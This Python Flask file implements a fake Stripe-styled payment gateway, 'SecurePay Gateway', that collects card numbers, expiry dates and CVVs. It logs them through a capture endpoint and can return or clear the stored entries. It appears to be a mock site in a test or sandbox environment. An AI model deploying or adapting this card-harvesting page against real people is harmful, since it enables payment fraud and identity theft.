"""SecurePay Gateway — Fake payment processor (port 10040, securepay-gateway.net).
Styled like Stripe. Collects cardholder name, card number, expiry, CVV.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flask import Flask, render_template, request, jsonify, redirect, url_for
from servers.utils import log_captured, load_log, save_log

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

app = Flask(
    __name__,
    template_folder=os.path.join(BASE_DIR, "templates", "securepay"),
    static_folder=os.path.join(BASE_DIR, "static"),
    static_url_path="/static",
)


@app.route("/")
def index():
    return redirect(url_for("checkout"))


@app.route("/checkout", methods=["GET", "POST"])
def checkout():
    if request.method == "POST":
        fields = request.form.to_dict()
        log_captured("securepay_gateway", 10040, "securepay-gateway.net", request, fields)
        return redirect(url_for("success", order_id=fields.get("order_id", "N/A")))
    # GET: render with query params pre-filled from merchant redirect
    context = {
        "merchant": request.args.get("merchant", "merchant"),
        "order_id": request.args.get("order_id", ""),
        "amount": request.args.get("amount", "0.00"),
        "item": request.args.get("item", "Item"),
        "email": request.args.get("email", ""),
        "name": request.args.get("name", ""),
    }
    return render_template("checkout.html", **context)


@app.route("/success")
def success():
    order_id = request.args.get("order_id", "")
    return render_template("success.html", order_id=order_id)


@app.route("/api/captured", methods=["POST"])
def captured():
    data = request.get_json(force=True, silent=True) or {}
    log_captured("securepay_gateway", 10040, "securepay-gateway.net", request, data)
    return jsonify({"status": "ok"})


@app.route("/api/captured", methods=["GET"])
def get_captured():
    return jsonify({"entries": load_log()})


@app.route("/api/clear", methods=["GET", "POST"])
def clear_captured():
    save_log([])
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10040, debug=False)
